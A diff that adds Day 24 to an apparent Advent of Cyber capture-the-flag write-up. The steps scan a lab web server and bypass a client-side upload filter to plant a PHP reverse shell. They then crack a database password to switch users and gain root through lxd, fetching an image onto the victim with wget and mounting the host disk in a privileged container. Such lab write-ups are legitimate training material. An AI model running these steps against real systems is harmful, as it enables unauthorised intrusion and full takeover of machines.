@@ -220,3 +220,48 @@ Password: Adventofcyber!
 # Day 23
 
 - Another incredibly slow Windows RDP connection. Discover a hidden partition, restore the previous version and look around the task scheduler for suspicious tasks.
+
+# Day 24
+
+`export IP=10.10.66.134`
+
+- Site found on http://10.10.128.40:65000/
+- Do a gobuster scan: `gobuster dir --wordlist /usr/share/wordlists/directory-list-2.3-medium.txt -u http://10.10.128.40:65000/ -x "php"`
+- Found uploads folder http://10.10.128.40:65000/uploads.php
+- Intercept loading of the filter.js and `return true`
+- Gobuster revealed a grid folder, that's where the files are uploaded to! http://10.10.141.109:65000/grid/jpg.jpeg
+- Upload reverse shell named jpeg.php to trick server side filter.
+- Get a real shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+- terminal commands `export TERM=xterm`
+- Kill own shell, `CTRL+Z`, `stty raw -echo; fg`, `CTRL + C`.
+- First flag is in the `var/www` folder.
+- dbauth.php contains db login `www/TheGrid/includes/dbauth.php`
+- Use crackstation to crack the pw found in the db users table.
+- pw for the flynn user is the same so switch using `su flynn`.
+- Now we can read the user.txt flag in fylnn's home directory.
+- User is member of the `lxd` group (found using `id`) which is a known privesc vector.
+- Build the alpine lxd image and download it on the victim machine:
+```bash
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+```
+
+- Host the tar.gz file using `python3 -m http.server`
+- Download on the victim from your THM IP `wget "http://127.0.0.1:8000/lxd.tar.gz`
+- Import the image `lxc image import ./lxd.tar.gz --alias privesc`
+
+- Now init and start the image in privileged mode.
+
+```bash	
+lxc init privesc ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
+
+- Don't forget to navigate to `/mnt/root` where the we mounted the disk in the steps above.
+
+- References
+https://www.hackingarticles.in/lxd-privilege-escalation/
